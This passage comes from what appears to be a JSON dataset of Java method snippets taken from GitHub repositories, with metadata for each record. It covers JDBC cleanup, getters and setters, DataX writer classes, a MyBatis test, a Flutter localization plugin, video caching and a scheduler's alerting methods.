void close(ResultSet rs, Statement stmt, Connection conn) {        if(rs != null) {            try {                rs.close();            } catch (SQLException throwables) {                throwables.printStackTrace();            }        }        if(stmt != null) {            try {                stmt.close();            } catch (SQLException throwables) {                throwables.printStackTrace();            }        }        if(conn != null) {            try {                conn.close();            } catch (SQLException throwables) {                throwables.printStackTrace();            }        }    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/jdbc/datasource/utils/JDBCUtils.java", "stars": "2", "class": {"name": "JDBCUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getDataSource", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "DataSource", "snippet": "    public static DataSource getDataSource() {        return ds;    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/jdbc/datasource/utils/JDBCUtils.java", "stars": "2", "class": {"name": "JDBCUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getActno", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getActno() {\t\treturn actno;\t}", "url": "https://raw.githubusercontent.com/hasaki-w-c/JAVA--/master/ray/Jichengtest.java", "stars": "2", "class": {"name": "Jichengtest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setActno", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setActno(String actno) {\t\tthis.actno = actno;\t}", "url": "https://raw.githubusercontent.com/hasaki-w-c/JAVA--/master/ray/Jichengtest.java", "stars": "2", "class": {"name": "Jichengtest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getBanlance", "params": [], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "\tpublic double getBanlance() {\t\treturn banlance;\t}", "url": "https://raw.githubusercontent.com/hasaki-w-c/JAVA--/master/ray/Jichengtest.java", "stars": "2", "class": {"name": "Jichengtest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setBanlance", "params": ["double"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setBanlance(double banlance) {\t\tthis.banlance = banlance;\t}", "url": "https://raw.githubusercontent.com/hasaki-w-c/JAVA--/master/ray/Jichengtest.java", "stars": "2", "class": {"name": "Jichengtest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "split", "params": ["int"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "List<Configuration>", "snippet": "        public abstract List<Configuration> split(int mandatoryNumber);    }    /**     * \u6bcf\u4e2aWriter\u63d2\u4ef6\u5fc5\u987b\u5b9e\u73b0Task\u5185\u90e8\u7c7b     */    public abstract static class Task extends EnhancedWriter.Task {", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/spi/Writer.java", "stars": "23", "class": {"name": "Job", "extends": "EnhancedWriter", "implements": null, "modifiers": ["public", "static", "abstract"]}}, {"method_name": "startWrite", "params": ["RecordReceiver"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "        public abstract void startWrite(RecordReceiver lineReceiver);        public boolean supportFailOver() {            return false;        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/spi/Writer.java", "stars": "23", "class": {"name": "Task", "extends": "EnhancedWriter", "implements": null, "modifiers": ["public", "static", "abstract"]}}, {"method_name": "supportFailOver", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean supportFailOver() {            return false;        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/spi/Writer.java", "stars": "23", "class": {"name": "Task", "extends": "EnhancedWriter", "implements": null, "modifiers": ["public", "static", "abstract"]}}, {"method_name": "setUp", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "  static void setUp() throws Exception {    // create an SqlSessionFactory    try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/primitive_array/mybatis-config.xml\")) {      sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);    }    // populate in-memory database    BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),            \"org/apache/ibatis/submitted/primitive_array/CreateDB.sql\");  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/primitive_array/PrimitiveArrayTest.java", "stars": "15", "class": {"name": "PrimitiveArrayTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "shouldGetAUser", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldGetAUser() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      Mapper mapper = sqlSession.getMapper(Mapper.class);      User user = mapper.getUser(1);      Assertions.assertEquals(\"User1\", user.getName());      Assertions.assertEquals(2, user.getNum().length);      Assertions.assertEquals(100, user.getNum()[0]);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/primitive_array/PrimitiveArrayTest.java", "stars": "15", "class": {"name": "PrimitiveArrayTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "getText", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getText() {        return \"Localize String\";    }", "url": "https://raw.githubusercontent.com/Norbert515/flutter_localizer/master/src/ExtractStringIntentionAction.java", "stars": "23", "class": {"name": "ExtractStringIntentionAction", "extends": null, "implements": ["IntentionAction"], "modifiers": []}}, {"method_name": "getFamilyName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getFamilyName() {        return \"Localizers\";    }", "url": "https://raw.githubusercontent.com/Norbert515/flutter_localizer/master/src/ExtractStringIntentionAction.java", "stars": "23", "class": {"name": "ExtractStringIntentionAction", "extends": null, "implements": ["IntentionAction"], "modifiers": []}}, {"method_name": "isAvailable", "params": ["Project", "Editor", "PsiFile"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isAvailable(@NotNull Project project, Editor editor, PsiFile file) {        PsiElement element = file.findElementAt(editor.getCaretModel().getOffset());        if(element == null) {            return false;        }        PsiElement parent = element.getParent();        if(parent == null) {            return false;        }        return parent instanceof DartStringLiteralExpression;    }", "url": "https://raw.githubusercontent.com/Norbert515/flutter_localizer/master/src/ExtractStringIntentionAction.java", "stars": "23", "class": {"name": "ExtractStringIntentionAction", "extends": null, "implements": ["IntentionAction"], "modifiers": []}}, {"method_name": "invoke", "params": ["Project", "Editor", "PsiFile"], "throws": ["IncorrectOperationException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void invoke(@NotNull final Project project, final Editor editor, PsiFile file) throws            IncorrectOperationException {        DialogBuilder builder = new DialogBuilder(project);        PsiElement element = file.findElementAt(editor.getCaretModel().getOffset());        DartStringLiteralExpression parent = (DartStringLiteralExpression)element.getParent();        String text = parent.getText().substring(1, parent.getTextLength() - 1);        JComponent content = new JPanel();        content.setLayout(new BoxLayout(content, BoxLayout.Y_AXIS));        content.setAlignmentX(Component.LEFT_ALIGNMENT);        JLabel keyLabel = new JLabel();        keyLabel.setText(\"Key\");        content.add(keyLabel);        JTextField keyTextField = new JTextField();        content.add(keyTextField);        keyTextField.setMaximumSize(new Dimension(Short.MAX_VALUE,                56));        keyTextField.requestFocusInWindow();        JLabel valueLabel = new JLabel();        valueLabel.setText(\"Value\");        content.add(valueLabel);        JTextField valueTextField = new JTextField();        valueTextField.setText(text);        content.add(valueTextField);        valueTextField.setMaximumSize(new Dimension(Short.MAX_VALUE,                56));        builder.setDimensionServiceKey(\"GrepConsoleTailFileDialog\");        builder.setTitle(\"Localize \\\"\" + text + \"\\\"\");        builder.centerPanel(content);        builder.removeAllActions();        builder.addOkAction();        builder.addCancelAction();        builder.setOkOperation(() -> {            JSONModifier.addTranslation(project, keyTextField.getText(), valueTextField.getText(), 0);            JSONModifier.addTranslation(project, keyTextField.getText(), valueTextField.getText(), 1);            String camelCaseKey = CaseFormat.UPPER_UNDERSCORE.to(CaseFormat.LOWER_CAMEL, keyTextField.getText());            String toSave = Settings.getReplacementString(project).replace(\"$$\", camelCaseKey);            WriteCommandAction.runWriteCommandAction(project, () -> {                parent.replace(DartElementGenerator.createExpressionFromText(project, toSave));            });            builder.getDialogWrapper().close(1);        });        builder.setPreferredFocusComponent(keyTextField);        builder.show();        builder.dispose();    }", "url": "https://raw.githubusercontent.com/Norbert515/flutter_localizer/master/src/ExtractStringIntentionAction.java", "stars": "23", "class": {"name": "ExtractStringIntentionAction", "extends": null, "implements": ["IntentionAction"], "modifiers": []}}, {"method_name": "startInWriteAction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean startInWriteAction() {        return false;    }", "url": "https://raw.githubusercontent.com/Norbert515/flutter_localizer/master/src/ExtractStringIntentionAction.java", "stars": "23", "class": {"name": "ExtractStringIntentionAction", "extends": null, "implements": ["IntentionAction"], "modifiers": []}}, {"method_name": "accept", "params": ["File", "long", "int"], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "    protected boolean accept(File file, long totalSize, int totalCount) {        return totalCount <= maxCount;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/file/TotalCountLruDiskUsage.java", "stars": "2", "class": {"name": "TotalCountLruDiskUsage", "extends": "LruDiskUsage", "implements": null, "modifiers": ["public"]}}, {"method_name": "doCacheLogic", "params": ["Context", "IMediaPlayer", "String", "Map<String,String>", "File"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void doCacheLogic(Context context, IMediaPlayer mediaPlayer, String url, Map<String, String> header, File cachePath) {        if (!(mediaPlayer instanceof IjkExo2MediaPlayer)) {            throw new UnsupportedOperationException(\"ExoPlayerCacheManager only support IjkExo2MediaPlayer\");        }        IjkExo2MediaPlayer exoPlayer = ((IjkExo2MediaPlayer) mediaPlayer);        mExoSourceManager = exoPlayer.getExoHelper();        //\u901a\u8fc7\u81ea\u5df1\u7684\u5185\u90e8\u7f13\u5b58\u673a\u5236        exoPlayer.setCache(true);        exoPlayer.setCacheDir(cachePath);        exoPlayer.setDataSource(context, Uri.parse(url), header);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/exo2/ExoPlayerCacheManager.java", "stars": "2", "class": {"name": "ExoPlayerCacheManager", "extends": null, "implements": ["ICacheManager"], "modifiers": ["public"]}}, {"method_name": "clearCache", "params": ["Context", "File", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clearCache(Context context, File cachePath, String url) {        ExoSourceManager.clearCache(context, cachePath, url);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/exo2/ExoPlayerCacheManager.java", "stars": "2", "class": {"name": "ExoPlayerCacheManager", "extends": null, "implements": ["ICacheManager"], "modifiers": ["public"]}}, {"method_name": "release", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void release() {        mExoSourceManager = null;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/exo2/ExoPlayerCacheManager.java", "stars": "2", "class": {"name": "ExoPlayerCacheManager", "extends": null, "implements": ["ICacheManager"], "modifiers": ["public"]}}, {"method_name": "hadCached", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hadCached() {        return mExoSourceManager != null && mExoSourceManager.hadCached();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/exo2/ExoPlayerCacheManager.java", "stars": "2", "class": {"name": "ExoPlayerCacheManager", "extends": null, "implements": ["ICacheManager"], "modifiers": ["public"]}}, {"method_name": "cachePreview", "params": ["Context", "File", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean cachePreview(Context context, File cacheDir, String url) {        return ExoSourceManager.cachePreView(context, cacheDir, url);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/exo2/ExoPlayerCacheManager.java", "stars": "2", "class": {"name": "ExoPlayerCacheManager", "extends": null, "implements": ["ICacheManager"], "modifiers": ["public"]}}, {"method_name": "setCacheAvailableListener", "params": ["ICacheAvailableListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCacheAvailableListener(ICacheAvailableListener cacheAvailableListener) {    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/exo2/ExoPlayerCacheManager.java", "stars": "2", "class": {"name": "ExoPlayerCacheManager", "extends": null, "implements": ["ICacheManager"], "modifiers": ["public"]}}, {"method_name": "handleLog", "params": ["ProceedingJoinPoint", "Object", "Object", "long"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void handleLog(ProceedingJoinPoint joinPoint, Object[] args, Object returnObj, long costTime) {        Method method = ((MethodSignature) joinPoint.getSignature()).getMethod();        InvokeLog invokeLog = method.getAnnotation(InvokeLog.class);        HttpServletRequest request = ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest();        String ip = RequestIpUtil.getIpAddr(request);        String params = getParam(args);        if (invokeLog.persistence()) {            //TODO \u65e5\u5fd7\u6301\u4e45\u5316\u65b9\u6848            // logService.saveLog(ip, request.getRequestURI(), params, getPrintMsg(true, returnObj));        }        printLogMsg(invokeLog.name(), invokeLog.description(), invokeLog.printReturn(), joinPoint, args, returnObj, costTime);    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-common/src/main/java/com/cgb/bcpinstall/common/log/InvokeLogAspect.java", "stars": "7", "class": {"name": "InvokeLogAspect", "extends": "AbstractPrintLog", "implements": null, "modifiers": ["public"]}}, {"method_name": "excudePointcut", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void excudePointcut() {    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-common/src/main/java/com/cgb/bcpinstall/common/log/InvokeLogAspect.java", "stars": "7", "class": {"name": "InvokeLogAspect", "extends": "AbstractPrintLog", "implements": null, "modifiers": ["public"]}}, {"method_name": "execute", "params": ["ProceedingJoinPoint"], "throws": ["Throwable"], "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object execute(ProceedingJoinPoint joinPoint) throws Throwable {        return super.execute(joinPoint);    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-common/src/main/java/com/cgb/bcpinstall/common/log/InvokeLogAspect.java", "stars": "7", "class": {"name": "InvokeLogAspect", "extends": "AbstractPrintLog", "implements": null, "modifiers": ["public"]}}, {"method_name": "alertOnIMSRegistStart", "params": ["ExecutableFlow", "Map<String,Props>", "Logger"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void alertOnIMSRegistStart(ExecutableFlow exflow,Map<String, Props> sharedProps,Logger logger) throws Exception {      //    loadAllProperties(exflow);      //\u4e0a\u62a5IMS \u4e1a\u52a1\u903b\u8f91\u5b9e\u73b0      logger.info(\"alertOnIMSRegistStart ims regist\");      HttpUtils.registerToIMS(exflow, this.props,              sharedProps.get(exflow.getExecutableNode(((ExecutableFlowBase)exflow).getStartNodes().get(0)).getPropsSource()),              logger);      logger.info(\"alertOnIMSRegistStart ims report\");      HttpUtils.uploadFlowStatusToIMS(exflow, this.props,              sharedProps.get(exflow.getExecutableNode(((ExecutableFlowBase)exflow).getStartNodes().get(0)).getPropsSource()),              logger);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "alertOnIMSRegistFinish", "params": ["ExecutableFlow", "Map<String,Props>", "Logger"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void alertOnIMSRegistFinish(ExecutableFlow exflow,Map<String, Props> sharedProps,Logger logger) throws Exception {//    loadAllProperties(exflow);    //\u4e0a\u62a5IMS \u4e1a\u52a1\u903b\u8f91\u5b9e\u73b0    logger.info(\"alertOnIMSRegistFinish ims report\");    HttpUtils.uploadFlowStatusToIMS(exflow, this.props,            sharedProps.get(exflow.getExecutableNode(((ExecutableFlowBase)exflow).getStartNodes().get(0)).getPropsSource()),            logger);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "alertOnIMSRegistError", "params": ["ExecutableFlow", "Map<String,Props>", "Logger"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void alertOnIMSRegistError(ExecutableFlow exflow,Map<String, Props> sharedProps,Logger logger) throws Exception {//    loadAllProperties(exflow);    //\u4e0a\u62a5IMS \u4e1a\u52a1\u903b\u8f91\u5b9e\u73b0    logger.info(\"alertOnIMSRegistError ims report\");//    HttpUtils.uploadFlowStatusToIMS(exflow, this.props,//            this.sharedProps.get(exflow.getExecutableNode(((ExecutableFlowBase)exflow).getStartNodes().get(0)).getPropsSource()),//            this.logger);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "alertOnSuccess", "params": ["ExecutableFlow"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void alertOnSuccess(ExecutableFlow exflow) throws Exception {    ExecutionOptions executionOptions = exflow.getExecutionOptions();    //\u8bbe\u7f6e\u544a\u8b66\u90ae\u4ef6\u5217\u8868    List<String> emails = executionOptions.getSuccessEmails();    //\u8bbe\u7f6e\u544a\u8b66\u7ea7\u522b    String successAlertLevel;    //\u5386\u53f2\u7248\u672c\u517c\u5bb9    if(null == exflow.getOtherOption().get(\"successAlertLevel\") || \"\".equals(exflow.getOtherOption().get(\"successAlertLevel\"))){      successAlertLevel = \"MAJOR\";    }else{      //\u8bbe\u7f6e\u544a\u8b66\u7ea7\u522b      successAlertLevel = exflow.getOtherOption().get(\"successAlertLevel\") + \"\";    }    this.doAlertByWeBank(exflow, emails, AlertLevel.valueOf(successAlertLevel));  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "alertOnError", "params": ["ExecutableFlow", "String"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void alertOnError(ExecutableFlow exflow, String... extraReasons) throws Exception {    ExecutionOptions executionOptions = exflow.getExecutionOptions();    //\u8bbe\u7f6e\u544a\u8b66\u90ae\u4ef6\u5217\u8868    List<String> emails = executionOptions.getFailureEmails();    //\u8bbe\u7f6e\u544a\u8b66\u7ea7\u522b    //String failureAlertLevel = exflow.getOtherOption().get(\"failureAlertLevel\") + \"\";    //\u8bbe\u7f6e\u544a\u8b66\u7ea7\u522b    String failureAlertLevel;    //\u5386\u53f2\u7248\u672c\u517c\u5bb9    if(null == exflow.getOtherOption().get(\"failureAlertLevel\") || \"\".equals(exflow.getOtherOption().get(\"failureAlertLevel\"))){      failureAlertLevel = \"MAJOR\";    }else{      //\u8bbe\u7f6e\u544a\u8b66\u7ea7\u522b      failureAlertLevel = exflow.getOtherOption().get(\"failureAlertLevel\") + \"\";    }    this.doAlertByWeBank(exflow, emails, AlertLevel.valueOf(failureAlertLevel));  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "alertOnFirstError", "params": ["ExecutableFlow"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void alertOnFirstError(ExecutableFlow exflow) throws Exception {    ExecutionOptions executionOptions = exflow.getExecutionOptions();    //\u8bbe\u7f6e\u544a\u8b66\u90ae\u4ef6\u5217\u8868    List<String> emails = executionOptions.getFailureEmails();    //\u8bbe\u7f6e\u544a\u8b66\u7ea7\u522b    //String failureAlertLevel = exflow.getOtherOption().get(\"failureAlertLevel\") + \"\";    String failureAlertLevel;    //\u5386\u53f2\u7248\u672c\u517c\u5bb9    if(null == exflow.getOtherOption().get(\"failureAlertLevel\") || \"\".equals(exflow.getOtherOption().get(\"failureAlertLevel\"))){      failureAlertLevel = \"MAJOR\";    }else{      //\u8bbe\u7f6e\u544a\u8b66\u7ea7\u522b      failureAlertLevel = exflow.getOtherOption().get(\"failureAlertLevel\") + \"\";    }    this.doAlertByWeBank(exflow, emails, AlertLevel.valueOf(failureAlertLevel));  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "alertOnSla", "params": ["SlaOption", "String"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void alertOnSla(SlaOption slaOption, String slaMessage) throws Exception {    this.doSlaAlerter(slaOption, slaMessage);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "alertOnSla", "params": ["SlaOption", "ExecutableFlow"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void alertOnSla(SlaOption slaOption, ExecutableFlow exflow) throws Exception {    this.doSlaAlerter(slaOption, exflow);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "doSlaAlerter", "params": ["SlaOption", "ExecutableFlow"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void doSlaAlerter(SlaOption slaOption, ExecutableFlow exflow){//    if(this.alerterWay.contains(\"1\")){      //\u53d1\u9001\u6d88\u606f\u6e20\u9053      //1 RTX\u6e20\u9053//      this.setAlerterWay(\"1\");//      logger.info(\"\u53d1\u9001 Sla RTX\u544a\u8b66\");//      //\u7ec4\u88c5RTX\u683c\u5f0f\u4fe1\u606f//      String slaMessageRTX = createRTXSlaMessage(slaOption, exflow);////      handleSlaAlerter(slaOption, slaMessageRTX);//    }    String newTitle = String.format(\"[%s:%s] %s\", exflow.getProjectName(), exflow.getFlowId(), this.title);    final String imsAlerterWays = this.props.getString(\"alarm.alerterWay\");    if(imsAlerterWays.contains(\"2\")){      //2 \u90ae\u7bb1\u6e20\u9053      this.setAlerterWay(\"2\");      logger.info(\"\u53d1\u9001 Sla \u90ae\u7bb1\u544a\u8b66\");      //\u7ec4\u88c5Email\u683c\u5f0f\u4fe1\u606f      String slaMessageEmail = createEmailSlaMessage(slaOption, exflow);      handleSlaAlerter(slaOption, slaMessageEmail, newTitle);    }    if(imsAlerterWays.contains(\"3\")){      //3 \u5fae\u4fe1\u6e20\u9053      this.setAlerterWay(\"3\");      logger.info(\"\u53d1\u9001 Sla \u5fae\u4fe1\u544a\u8b66\");      //\u7ec4\u88c5Email\u683c\u5f0f\u4fe1\u606f      String slaMessageWeChat = createRTXSlaMessage(slaOption, exflow);      handleSlaAlerter(slaOption, slaMessageWeChat, newTitle);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "alertOnFinishSla", "params": ["SlaOption", "ExecutableFlow"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void alertOnFinishSla(SlaOption slaOption, ExecutableFlow exflow) throws Exception {    this.doFinishSlaAlerter(slaOption, exflow);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "alertOnFlowPaused", "params": ["ExecutableFlow", "String"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void alertOnFlowPaused(ExecutableFlow exflow, String nodePath) throws Exception {    String newTitle = String.format(\"[%s:%s] %s\", exflow.getProjectName(), exflow.getFlowId(), this.title);    //2 \u90ae\u7bb1\u6e20\u9053    final String imsAlerterWays = this.props.getString(\"alarm.alerterWay\");    if(imsAlerterWays.contains(\"2\")){      this.setAlerterWay(\"2\");      logger.info(\"\u53d1\u9001 Flow Paused \u901a\u7528 \u90ae\u7bb1\u544a\u8b66\");      //\u7ec4\u88c5Email\u683c\u5f0f\u4fe1\u606f      String slaMessageEmail = buildFlowPausedMessage(exflow, nodePath, \"</br>\");      handleFlowPausedAlerter(exflow, slaMessageEmail, newTitle);    }    if(imsAlerterWays.contains(\"3\")){      //3 \u5fae\u4fe1\u6e20\u9053      this.setAlerterWay(\"3\");      logger.info(\"\u53d1\u9001 Flow Paused \u901a\u7528 \u5fae\u4fe1\u544a\u8b66\");      //\u7ec4\u88c5Email\u683c\u5f0f\u4fe1\u606f      String slaMessageWeChat = buildFlowPausedMessage(exflow, nodePath, \"\\n\");      handleFlowPausedAlerter(exflow, slaMessageWeChat, newTitle);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "alertOnFlowPausedSla", "params": ["SlaOption", "ExecutableFlow", "String"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void alertOnFlowPausedSla(SlaOption slaOption, ExecutableFlow exflow, String nodePath) throws Exception {    String newTitle = String.format(\"[%s:%s] %s\", exflow.getProjectName(), exflow.getFlowId(), this.title);    //2 \u90ae\u7bb1\u6e20\u9053    final String imsAlerterWays = this.props.getString(\"alarm.alerterWay\");    if(imsAlerterWays.contains(\"2\")){      this.setAlerterWay(\"2\");      logger.info(\"\u53d1\u9001 Flow Paused sla \u90ae\u7bb1\u544a\u8b66\");      //\u7ec4\u88c5Email\u683c\u5f0f\u4fe1\u606f      String slaMessageEmail = buildFlowPausedMessage(slaOption, exflow, nodePath,\"</br>\");      handleSlaAlerter(slaOption, slaMessageEmail,newTitle);    }    if(imsAlerterWays.contains(\"3\")){      //3 \u5fae\u4fe1\u6e20\u9053      this.setAlerterWay(\"3\");      logger.info(\"\u53d1\u9001 Flow Paused sla \u5fae\u4fe1\u544a\u8b66\");      //\u7ec4\u88c5Email\u683c\u5f0f\u4fe1\u606f      String slaMessageWeChat = buildFlowPausedMessage(slaOption, exflow, nodePath,\"\\n\");      handleSlaAlerter(slaOption, slaMessageWeChat, newTitle);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/WeBankAlerter.java", "stars": "18", "class": {"name": "WeBankAlerter", "extends": null, "implements": ["Alerter"], "modifiers": ["public"]}}, {"method_name": "doFinishSlaAlerter", "params": ["SlaOption", "ExecutableFlow"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void doFinishSlaAlerter(SlaOption slaOption, ExecutableFlow exflow){//    if(this.alerterWay.contains(\"1\")){      //\u53d1\u9001\u6d88\u606f\u6e20\u9053      //1 RTX\u6e20\u9053//      this.setAlerterWay(\"1\");//      logger.info(\"\u53d1\u9001 FinishSla RTX\u544a\u8b66\");//      //\u7ec4\u88c5RTX\u683c\u5f0f\u4fe1\u606f//      String slaMessageRTX = createRTXFinishSlaMessage(slaOption, exflow);////      handleSlaAlerter(slaOption, slaMessageRTX);//    }//    if(this.alerterWay.contains(\"2\")){    String newTitle = String.format(\"[%s:%s] %s\", exflow.getProjectName(), exflow.getFlowId(), this.title);      //2 \u90ae\u7bb1\u6e20\u9053    final String imsAlerterWays = this.props.getString(\"alarm.alerterWay\");    if(imsAlerterWays.contains(\"2\")){      this.setAlerterWay(\"2\");      logger.info(\"\u53d1\u9001 FinishSla \u90ae\u7bb1\u544a\u8b66\");      //\u7ec4\u88c5Email\u683c\u5f0f\u4fe1\u606f      String slaMessageEmail = createEmailFinishSlaMessage(slaOption, exflow);      handleSlaAlerter(slaOption, slaMessageEmail,newTitle);    }    